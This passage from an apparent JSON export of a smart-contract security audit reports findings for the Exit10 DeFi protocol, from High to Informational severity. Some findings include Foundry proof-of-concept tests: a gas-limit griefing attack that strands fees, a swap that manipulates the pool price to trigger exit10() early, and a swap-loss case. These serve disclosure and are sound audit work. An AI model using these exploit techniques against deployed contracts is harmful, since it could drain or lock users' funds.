        "body": "When claimAndDistributeFees() is called, the function will collect fees from the Uniswap pool, which will send the funds to the caller contract. The implementation will then try to compound the proportion corresponding to the bootstrap bucket using increaseLiquidity(): https://github.com/open-bakery/exit10-protocol/blob/0b3c2782c5a93d2218234bc70fee31ec32f9e337/src/Exit10.sol#L439-L457 439: try 440: INPM(NPM).increaseLiquidity( 441: INPM.IncreaseLiquidityParams({ 442: tokenId: positionId, 443: amount0Desired: bootstrapFees0, 444: amount1Desired: bootstrapFees1, 445: amount0Min: 0, 446: amount1Min: 0, 447: deadline: DEADLINE 448: }) 449: ) 450: returns (uint128, uint256 amountAdded0, uint256 amountAdded1) { 451: unchecked { 452: amountCollected0 -= amountAdded0; 453: amountCollected1 -= amountAdded1; 454: } 455: } catch { 456: return; 457: } The external call is wrapped in a try/catch statement. The main issue is that if the call to increaseLiquidity() fails then the catch block will simply return from the function, which means the call to claimAndDistributeFees() will succeed. However, funds from fees have been already claimed but won't be sent to the FeeSplitter.sol contract. Additionally, this issue can be exploited by a bad actor using EIP-150 and the \"rule of 1/64th\". A bad actor can carefully choose the gas limit to make the call to increaseLiquidity() fail due out of gas, while still saving some gas in the main context to continue execution. The call to increaseLiquidity() will revert due to gas limits, and the catch block will be executed thanks to the saved gas. The following test reproduces the issue. We set up the liquidity and fees, and mock the call to increaseLiquidity() to make it revert. The fees will never reach the FeeSplitter.sol and will be stuck in Exit10.sol. Note: the following test requires a newer version of the Forge Standard Library in order to use vm.mockCallRevert(). It can be installed by executing forge install foundry-rs/forge-std --no-commit. function test_Exit10_claimAndDistributeFees_LossOfFeesIfIncreaseLiquidityReverts() public { // Generate liquidity and fees _bootstrapLock(10_000e6, 1 ether); _skipBootstrap(); _createBond(100_000e6, 10 ether); _generateFees(address(token0), address(token1), 1000e6); // Assume call to nonfungiblePositionManager.increaseLiquidity reverts vm.mockCallRevert( nonfungiblePositionManager, abi.encodeWithSelector(INPM.increaseLiquidity.selector), \"\" ); // Call function exit10.claimAndDistributeFees(); // FeeSplitter is empty uint256 feesClaimed0 = token0.balanceOf(feeSplitter); uint256 feesClaimed1 = token1.balanceOf(feeSplitter); assertEq(feesClaimed0, 0); assertEq(feesClaimed1, 0); // Fees are stuck in exit10 contract assertGt(token0.balanceOf(address(exit10)), 0); assertGt(token1.balanceOf(address(exit10)), 0); } In this other test we demonstrate the griefing scenario. Even if the call to increaseLiquidity() would succeed, a bad actor can arbitrarily exercise the issue by choosing a gas limit such that the call reverts due out of gas. The entire call to claimAndDistributeFees takes about ~360k units of gas, before calling increaseLiquidity() the gas cost is a bit more than 150k and the call to increaseLiquidity() itself takes a bit more than 50k gas. By choosing 200k units of gas we can get to point of calling increaseLiquidity(), but make this call fail due to out of gas since the forwarded gas will be less than 50k. function test_Exit10_claimAndDistributeFees_IntentionalRevert() public { // Generate liquidity and fees _bootstrapLock(10_000e6, 1 ether); _skipBootstrap(); _createBond(100_000e6, 10 ether); _generateFees(address(token0), address(token1), 1000e6); // Call function and supply a gas limit such that the call to \"increaseLiquidity()\" reverts due to OOG. // The function still continues execution since EIP150 will save 1/64 of available gas, enough to // execute the return in the catch clause. exit10.claimAndDistributeFees{gas: 200_000}(); // FeeSplitter is empty uint256 feesClaimed0 = token0.balanceOf(feeSplitter); uint256 feesClaimed1 = token1.balanceOf(feeSplitter); assertEq(feesClaimed0, 0); assertEq(feesClaimed1, 0); // Fees are stuck in exit10 contract assertGt(token0.balanceOf(address(exit10)), 0); assertGt(token1.balanceOf(address(exit10)), 0); }",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Using tick as price proxy is slightly inaccurate",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "_requireOutOfTickRange() is the key function that determines whether the price of ETH has reached a price above $10k and whether the Exit10 protocol's mission is complete. This function works by checking the WETH/USDC tick value and determining whether it is in the tick range or not. The tick values set in the environment variables are LOWER_TICK=184210 and UPPER_TICK=214170. We can do some math to check what ETH prices this corresponds to. // Step 1. calculate 1.0001^tickValue // Step 2. multiply by 10^-12 because of the USDC/WETH decimals conversion // Step 3. invert the value because of the order of WETH and USDC addresses 1 / ((1.0001**184210) * (10 ** -12)) = 10006.019136330182 1 / ((1.0001**214170) * (10 ** -12)) = 500.24195658614434 The chosen tick value that is used for the lower tick corresponds to a price of roughly $10006, which means that if the price of ETH only reaches $10005 before dropping below $10k, the exit10() function cannot be called. A tick value of 184216 or relying on slot0.sqrtPriceX96 instead of slot0.tick would be more precise, but using one of these values would then break the stated goal of holding only USDC when ETH arrives ta $10k because liquidity can only be removed at ticket intervals of 10 ticks. In summary, the protocol has 2 conflicting goals that are slightly mismatched: triggering exit10() when the price of ETH rises above $10k and holding only USDC at the same time that exit10() is called. One possible improvement for price data that would also protect against the situation of a USDC depeg event causing the price of ETH to appear to rise above $10k is to use Chainlink or another decentralized oracle solution for price data. Even if Chainlink is not the primary source of price data, it would be a useful secondary data source to validate that the Uniswap TWAP price is correct and that the price of ETH has indeed reached above 10k to allow exit10() to be called.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Incorrect EXIT_DISCOUNT values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The docs page describing the EXIT token describes a 5% discount on the EXIT token. But this value is not used consistently in the code. The value set in the .env file combined with the constant PERCENT_BASE value results in a much lower discount, only 0.05%.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Problematic MasterchefExit rewards distribution to first EXIT staker",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "There are three problems with MasterchefExit.deposit(): Only the first staker to call deposit() receives rewards, which can lead to frontrunning of this function. A zero amount is permitted in deposit(), meaning the caller does not need to have any tokens. Because a zero amount is permitted in deposit(), pool.totalStaked will not increase after deposit() is called the first time with a zero amount, so deposit() can keep getting called with a zero amount by anyone until there is a non-zero value staked.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Griefer can force bootstrap depositors to lose all funds if exit10() is triggered during the bootstrap phase",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Within the bootstrapLock(..) function in the Exit10 contract, there is no check which prevents a user from calling it even after the exit10() function has been called and inExitMode has been set to true. The call to exit10() will set bootstrapBucketFinal to the current bootstrap funds - however an attacker is still able to call bootstrapLock(..), thus increasing the actual size of the bootstrap bucket to be greater than bootstrapBucketFinal. If the attacker deposits an amount equal to bootstrapBucketFinal, they will be able to trap all existing bootstrapper's deposits in the contract. To do so, they first call bootstrapLock(..) with this amount, and then call bootstrapClaim(). This function will call _safeTokenClaim() which has the following check which only allows an amount up to bootstrapBucketFinal to be claimed: _claim = (_claimed + _claim <= _supply) ? _claim : _supply - _claimed;. Thus, the attacker will be able to withdraw their own funds, leaving normal bootstrap depositors locked out of claiming.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Updating fees with zero amount can be used to dilute rewards",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The updateFees() function present in FeeSplitter.sol is used to swap fees to ETH and feed those as rewards in Masterchef.sol. Doing so recalculates the reward rate to include the new amounts and extends the reward period by the configured rewards duration. This function can be abused by a malicious actor to dilute the reward process by calling it with a zero amount. This action won't increase the amount of rewards, but will extend the reward period, effectively lowering the reward rate. Current stakers will need to wait an additional period to claim their rewards. In this test, the issue is triggered each day using a reward duration of 10 days, and produces the following log: Logs: Logs: MC0 RewardRate: 599161603689814814814814814 MC0 PeriodFinish: 1684365053 MC1 RewardRate: 1048532902071511243386243386 MC1 PeriodFinish: 1684365053 ============================================= MC0 RewardRate: 556364346283399470899470898 MC0 PeriodFinish: 1684451453 MC1 RewardRate: 973637694780689011715797429 MC1 PeriodFinish: 1684451453 ============================================= MC0 RewardRate: 516624035834585222978080119 MC0 PeriodFinish: 1684537853 MC1 RewardRate: 904092145153496939450383326 MC1 PeriodFinish: 1684537853 ============================================= MC0 RewardRate: 479722318989257707051074396 MC0 PeriodFinish: 1684624253 MC1 RewardRate: 839514134785390015203927374 MC1 PeriodFinish: 1684624253 ============================================= MC0 RewardRate: 445456439061453585118854796 MC0 PeriodFinish: 1684710653 MC1 RewardRate: 779548839443576442689361133 MC1 PeriodFinish: 1684710653 ============================================= MC0 RewardRate: 413638121985635471896079453 MC0 PeriodFinish: 1684797053 MC1 RewardRate: 723866779483320982497263909 MC1 PeriodFinish: 1684797053 ============================================= MC0 RewardRate: 384092541843804366760645206 MC0 PeriodFinish: 1684883453 MC1 RewardRate: 672162009520226626604602201 MC1 PeriodFinish: 1684883453 ============================================= MC0 RewardRate: 356657360283532626277741977 MC0 PeriodFinish: 1684969853 MC1 RewardRate: 624150437411639010418559186 MC1 PeriodFinish: 1684969853 ============================================= MC0 RewardRate: 331181834548994581543617550 MC0 PeriodFinish: 1685056253 MC1 RewardRate: 579568263310807652531519244 MC1 PeriodFinish: 1685056253 ============================================= MC0 RewardRate: 307525989224066397147644867 MC0 PeriodFinish: 1685142653 MC1 RewardRate: 538170530217178534493553583 MC1 PeriodFinish: 1685142653 ============================================= MC0 RewardRate: 285559847136633083065670233 MC0 PeriodFinish: 1685229053 MC1 RewardRate: 499729778058808639172585469 MC1 PeriodFinish: 1685229053 =============================================",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Pool spot price manipulation allows to call exit10() before ETH reaches 10K",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "In Exit10.exit10() it is checked inside _requireOutOfTickRange() whether the price of ETH has surpassed 10k by comparing the current tick to the upper or lower tick of the position range. function _requireOutOfTickRange() internal view { if (TOKEN_IN > TOKEN_OUT) { require(_currentTick() <= TICK_LOWER, 'EXIT10: Current Tick not below TICK_LOWER'); } else { require(_currentTick() >= TICK_UPPER, 'EXIT10: Current Tick not above TICK_UPPER'); } } _currentTick() is taken from slotO() function _currentTick() internal view returns (int24 _tick) { (, _tick, , , , , ) = POOL.slot0(); } The tick value returned by slotO() is the current tick and moves as the liquidity inside the pool is used up during swaps. If the USDC cumulated liquidity from the current price up to 10k is less than what can be obtained with a flash loan, then it is possible to take a flashloan and make a swap which will push the price beyond 10k. At this moment on Optimism there is: 3.24M of USDC liquidity on UniV3 WETH/USDC 500 pool 8M USDC available to borrow on AaveV3 The following PoC shows how a 4M USDC to ETH swap will manipulate the current tick to more than -184210 (corresponds to 10k on Optimism). function testManipulate() public { console2.log(\"block number:\", block.number); (uint160 sqrtPriceX96Init, int24 tickInit, , , , , ) = pool.slot0(); // Take USDC from a large holder instead of flashloan for simplicity address atck = address(0xEbe80f029b1c02862B9E8a70a7e5317C06F62Cae); uint value = 4_000_000 * 1e6; vm.startPrank(atck); IERC20(pool.token1()).approve(address(router), value); ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams( pool.token1(), // USDC pool.token0(), // WETH 500, atck, block.timestamp, value, 0, 0 ); router.exactInputSingle(params); vm.stopPrank(); (uint160 sqrtPriceX96Fin, int24 tickFin, , , , , ) = pool.slot0(); console2.log(\"tickInit:\", tickInit); console2.log(\"tickFin:\", tickFin); } which outputs: Logs: block number: 95682224 tickInit: -201109 tickFin: -102138 Full PoC file here: https://gist.github.com/bahurum/9daac43a30cd67fe02453a58a52645b5 At any time, an attacker can take a flashloan, swap USDC to ETH, trigger exit10() and swap ETH back to USDC on the pool. Note that this may not yield any profit for the attacker (who would have to pay at least for flash loan fees), but the result is that the protocol ends sooner than expected.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Use _collect() return values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "_decreaseLiquidity() is called before each _collect() call (except one) to return the amount of each token that is passed to _collect(). However, after _collect() is called, it is assumed that the values passed as arguments to _collect() are equivalent to the values that are returned by _collect(). Looking at the Uniswap v3 NatSpec for the underlying NonfungiblePositionManager.collect(), the arguments are described as indicating the maximum amount of tokens to collect, and the return values from collect() indicate the actual value that is returned by the function. One example of this assumption is in bootstrapLock(). amountRemoved0 and amountRemoved1 are passed to _collect() as arguments and then are subtracted from amountAdded0 and amountAdded1. But because the arguments passed to _collect() are the maximum values that could be collected, the return values from _collect() should be what is subtracted from amountAdded0 and amountAdded1.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. No emergency function(s) to handle edge cases",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The Exit10 protocol is designed to be immutable, with renounceOwnership() calls in NFT.sol and FeeSplitter.sol. This immutability and the lack of emergency functions could result in locked funds due to uncontrollable external events. The funds that are locked until Exit10.exit10() is called include bootstrap funds, STO, and EXIT, which can only be withdrawn with bootstrapClaim(), stoClaim(), exitClaim(). Uniswap fees are currently passed on to liquidity providers. The Uniswap DAO has long discussed the idea of turning on the fee switch in order to direct some of these fees to Uniswap token holders. This change could substantially impact the fees earned by liquidity providers and may therefore change the assumptions in the Exit10 protocol. A similar result could happen if other events, such as a Uniswap hack or a better AMM, causes the ETH-USDC pool to generate substantially lower fees than estimated. Regardless of what actually happens, the assumption that the underlying Uniswap LP positions will generate fees when held in Exit10 depends on external factors not under control of the protocol. If these assumptions change, it may be useful to allow for emergency withdrawal of funds even before ETH reaches 10k. Another edge case that may occur is if ETH never reaches 10k. While this is a very pessimistic case, external factors like new laws banning certain cryptocurrencies, hacks, hard forks, or other factors could impact the price of ETH and when it might reach 10k. If the price of ETH does not reach 10k before the hardcoded deadline timestamp, which is in the year 2286, the funds will be locked. Another edge case is if a USDC depeg event happens. This could cause the price of ETH in the Uniswap pool to appear to rise above 10k, but in actuality the price of ETH may only be at a lower value such as $8000. A final edge case is that one of the Uniswap contracts behind a proxy, such as the Uniswap v3 Router, may undergo a change that is not backwards compatible. While this is unlikely to happen, a security vulnerability or unexpected DAO vote could cause this to happen.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Inelegant rounding solution",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The purpose of _safeTokenClaim() is to burn all tokens held by a user and to return the quantity of rewards the user can claim. The calculation of claimable rewards due to the user is a 2-step process. In the first step, the user's claimable rewards is calculated as the fraction of final totalSupply that msg.sender owns. This calculation is similar to how ERC4626 asset <-> share conversion happens in functions such as convertToShares() and convertToAssets(). The second step is to modify the value of the user's claimable rewards if the total claimed rewards (including the amount that is claimed in the active transaction) exceeds the total supply of rewards that exist. The fact that this second step exists implies that the protocol could encounter a situation where the outstanding rewards exceed the rewards that the protocol can afford to payout, which means that at least one user owed rewards will not receive their full amount of rewards. The way the logic works could lead to a bank run scenario, where user(s) who are late to redeem their rewards don't receive the full value of their rewards. While it is not clear under what circumstance this line of logic would be needed, a better design is one like ERC4626 that manages the rounding up or down appropriately and never reaches a bank run type scenario where some users do not receive the expected amount of value due to rounding error accumulation.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Incentive tokens EXIT, BOOT exposed to frontrunning",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "There is a limited supply of EXIT tokens. If a user converts a bond with convertBond() and _mintExitCapped() is called when mintAmount evaluates to zero or when the amount of EXIT to be minted updates to MAX_EXIT_SUPPLY - EXIT.totalSupply() instead of the original amount input argument, then the user may end up receiving less EXIT tokens than they expected (with a worst case of receiving zero EXIT). The process of increasing EXIT.totalSupply() to the MAX_EXIT_SUPPLY is at risk of being frontrun if a user is converting a bond in the same block as another user. The same frontrun risk exists with BOOT tokens in bootstrapLock(). Once bootstrapBucket increases to the value of BOOTSTRAP_CAP or near this value, a user calling bootstrapLock() may receive less BOOT tokens than expected (with a worst case of receiving zero BOOT). This means that user calls to bootstrapLock() (and also calls to swapAndBootstrapLock()) could be frontrun with the user receiving less BOOT than expected. The risk of frontrunning bootstrapLock() to claim BOOT is greater than the risk of frontrunning convertBond() to claim EXIT, because only users with existing bonds can call convertBond().",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Incorrect PROTOCOL_GUILD address for multichain deployment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "PROTOCOL_GUILD is hardcoded to 0xF29Ff96aaEa6C9A1fBa851f74737f3c069d4f1a9 in this line. But checking the Optimism blockchain scanner and Arbitrum blockchain scanner shows there is no contract deployed to these addresses. Any funds sent to this address on chains other than mainnet will not be useful to the Protocol Guild. The Protocol Guild only takes donations on Ethereum mainnet.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. High hardcoded slippage",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The slippage can be changed to a lower value. It won't cause the protocol to become stuck because FeeSplitter.sol uses function updateFees(uint256 swapAmountOut) to swap which has an input parameter. If the liquidity gets too low, and defined slippage is too high, input swapAmountOut can be decreased to complete the swaps.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Bootstrap rewards are shared",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "When a user locks in an amount for bootstrapping, they transfer in USDC and WETH in order to add liquidity to the pool. BOOT tokens are then minted to the user 1:1 for the amount of liquidity they were able to add to the pool. Regardless of when a user locks into bootstrapping, they are minted the same ratio of BOOT as the original entrants. After the protocol has performed an Exit10 and a user goes to claim their BOOT, they are given USDC based on the ratio of the BOOT they own to the size of the bootstrap bucket. This means that fees generated during the bootstrap period are distributed to all bootstrappers, penalizing the early bootstrappers.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Possible loss of funds with price limited swaps through DepositHelper",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "In DepositHelper._depositAndSwap() a user can provide TOKEN_IN and TOKEN_OUT at a certain ratio and make the contract perform a swap with _swapParams in order to provide liquidity at a different ratio. Let's say that _swapParams.tokenIn == TOKEN_0. The issue is that the contract assumes that _swapParams.amountIn is fully used for the swap and computes the amount to provide as liquidity as _initialAmount0 - _swapParams.amountIn (DepositHelper.sol#L85-L91). if (_swapParams.tokenIn == TOKEN_0) { _initialAmount0 -= _swapParams.amountIn; _initialAmount1 += amountOut; } else { _initialAmount1 -= _swapParams.amountIn; _initialAmount0 += amountOut; } Here is a PoC that demonstrates the issue: function testPriceLimitSwaps() public { _skipBootstrap(); uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(tickLower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(tickUpper); (uint160 sqrtRatioX96, int24 tick, , , , , ) = IUniswapV3Pool(vm.envAddress('POOL')).slot0(); console.log(\"initial USDC balance of DepositHelper:\", ERC20(usdc).balanceOf(address(depositHelper))); console.log(\"sqrtRatioX96:\", sqrtRatioX96); (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity( sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e15); // amounts to obtain 1e15 liquidity uint256 swapAmount0 = convert1ToToken0(sqrtRatioX96, amount1, 6); // usdc amount to swap ERC20(usdc).transfer(alice, amount0 + swapAmount0); // give usdc to alice IUniswapV3Router.ExactInputSingleParams memory swapParams = _getSwapParams( usdc, weth, swapAmount0); swapParams.sqrtPriceLimitX96 = TickMath.getSqrtRatioAtTick(tick - 1); console.log(\"alice sends\", amount0 + swapAmount0, \"USDC\"); console.log(\"and swaps\", swapAmount0, \"USDC for ETH\"); console.log(\"swapParams.sqrtPriceLimitX96 set to:\", swapParams.sqrtPriceLimitX96); vm.startPrank(alice); ERC20(usdc).approve(address(depositHelper), amount0 + swapAmount0); depositHelper.swapAndCreateBond(amount0 + swapAmount0, 0, swapParams); vm.stopPrank(); uint256 usdcLeft = ERC20(usdc).balanceOf(address(depositHelper)); console.log(\"Only\", swapAmount0 - usdcLeft, \"USDC has been swapped and used to mint bonds\"); console.log(\"USDC Left into DepositHelper:\", usdcLeft); } which outputs: Logs: initial USDC balance of DepositHelper: 0 sqrtRatioX96: 1980704062856608439838598758400000 alice sends 41638723701 USDC and swaps 24004813136 USDC for ETH swapParams.sqrtPriceLimitX96: 1980530912134207514651007739210316 Only 5701654427 USDC has been swapped and used to mint bonds USDC Left into DepositHelper: 18303158709 Full PoC file here: https://gist.github.com/bahurum/96a5a6c2082b81712392924cd2e673fd.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Relying on hardcoded values can save gas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The variables TOKEN_IN and POOL are immutable in Exit10.sol. In UniswapV3Pool.sol the variables token1 and token0 are immutable. Because these values are not changing, branching logic like this if statement can be removed and simplified because the same logic path will always be followed because immutable variables cannot change after deployment. The same applies to places where POOL.token0() is used, it can be replaced with TOKEN_IN or TOKEN_OUT to remove an external call.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Unnecessary 1e18 decimals multiplication",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "_getAccruedLiquidity() multiplies 1e18 by the value of block.timestamp - _params.startTime so that the resulting bondDuration variable has decimals of 1e18. But this is unnecessary because in the next line of code, the presence of bondDuration in the numerator and denominator means these decimals will cancel each other out. The code can be simplified and one multiplication operation removed by keeping the original decimals that block.timestamp has.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Pass _liquidityAmount() to collectFees() for 2nd argument",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The only place where the remainingBuckets argument is used in on lines of code like pendingBucket + remainingBuckets. This summation should return the same value as Exit10._liquidityAmount(), so pass _liquidityAmount() instead of bootstrapBucket + reserveBucket + _exitBucket() as the 2nd parameter to FeeSplitter.collectFees() to save gas. Even better, cache _liquidityAmount() instead of calling the internal function multiple times.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Remove function used only once",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Functions _getDiscountedExitAmount() and _getLiquidityForBootsrapTarget() are used only once. They can be removed and their code can be inlined to the only place where they are used. This will save gas without sacrificing readability if the variable naming is in line. The same is true of _transferAmountIn() in AMasterchefBase, it is only used in deposit().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Remove unused variables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "State variable FACTORY is defined and used only in constructor() and can be removed. State variable bootstrapDeposit is not used at all and can be removed.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Remove unneeded variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "There is no need to store deployment timestamp because this information can be retrieved from deployed block. This value is not used in any function and can be removed. Small change is required in Exit10.sol. - DEPLOYMENT_TIMESTAMP = block.timestamp; - BOOTSTRAP_PERIOD = params_.bootstrapPeriod; + BOOTSTRAP_PERIOD = params_.bootstrapPeriod + block.timestamp; Additional gas saving will be in dropping add operation at L554: - return (block.timestamp < DEPLOYMENT_TIMESTAMP + BOOTSTRAP_PERIOD); + return (block.timestamp < BOOTSTRAP_PERIOD);",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Struct packing",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The allocPoint and lastUpdateTime elements are currently uint256, however, allocPoint appears unlikely to exceed 100 and lastUpdateTime is only required to be as large as necessary to hold updated block.timestamp values. Given this, it may be reasonable to combine these two with the token address in order to have all three occupy only a single slot in storage.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Skip double fetching of the same value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "All functions that call _updatePool() already fetch the value from the storage, except _massUpdatePools() which can be easily changed to fetch the value from the storage. This will save gas on every call of _updatePool().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Use Shift Left instead of Multiplication if possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "In the file FeeSplitter.sol:125: -uint256 mc0TokenIn = (pendingBucketTokenIn * 4) / 10; // 40% +uint256 mc0TokenIn = (pendingBucketTokenIn << 2) / 10; // 40% In the file Exit10.sol:608: -_stoRewards = tenPercent * 2; +_stoRewards = tenPercent << 1;",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Cache state variables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "In exitClaim() and stoClaim() the state variables EXIT and STO (respectively) are loaded three times, rather than being cached in a local variable.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Redundant check in cancelBond()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "When a user cancels their bond, the amount of liquidity that they provided initially is removed from Uniswap, in order to pay them back. The _decreaseLiquidity() function requires a parameter of type RemoveLiquidity. In order to save gas, it is possible to remove the check _requireEqualValues and instead update the memory param parameter with bond.bondAmount.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. >= costs less gas than >.",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The compiler uses opcodes GT and ISZERO for solidity code that uses >, but only requires LT for >=, which saves 3 gas. File: Exit10-code/exit10-protocol/src/AMasterchefBase.sol 215: if (_poolLastUpdateTime > periodFinish) return 0; File: Exit10-code/exit10-protocol/src/Exit10.sol 177: if (bootstrapBucket > BOOTSTRAP_CAP) { 482: uint256 liquidityPerExit = actualLiquidityPerExit > projectedLiquidityPerExit 529: uint256 mintAmount = newSupply > MAX_EXIT_SUPPLY ? MAX_EXIT_SUPPLY - EXIT.totalSupply() : amount; 566: if (TOKEN_IN > TOKEN_OUT) {",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Standardize ProcessEth implementation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Compare the implementations of _processEth(): DepositHelper implementation, without an event UniswapBase implementation, without an event",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Consider else if instead of else for stricter checks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Some else branches might be best changed to else if branches to ensure that no unexpected edge cases trigger the else case. For example: This else branch could be replaced with else if (POOL.token0() == TOKEN_IN) This else branch could be replaced with else if (_swapParams.tokenIn == TOKEN_1)",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Possibly unnecessary event emit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The MintExit event is emitted in _mintExitCapped(). This is the only event emitted in an internal function of Exit10.sol. It is emitted even when no EXIT token is minted. Instead, consider expanding the if statement to determine if EXIT is minted to include this emit. Another side effect of this emit is that it is duplicating the emit in ERC20._mint(), so each minting event will have 2 emits. Consider whether this is the intended result for minting EXIT tokens.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Revert on zero case",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Consider the implementation of _safeTransferToken(): function _safeTransferToken(address _token, address _recipient, uint256 _amount) internal { if (_amount != 0) IERC20(_token).safeTransfer(_recipient, _amount); } If _amount is zero, _safeTransferToken() will not revert, but means any functions calling _safeTransferToken() will continue executing. This is similar behavior to phantom functions, an area of research that dedaub previously found a novel security issue with. Because there should be no changes when an amount of zero is involved, reverting will save the user gas and also prevent later logic from executing unexpectedly.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Replace modifiers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "NFT.sol and FeeSplitter.sol implement an onlyAuthorized modifier. This modifier can be replaced with internal functions in the same way that _requireExitMode(), _isBootstrapOngoing(), and similar internal functions are implemented in Exit10.sol.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Missing NatSpec",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
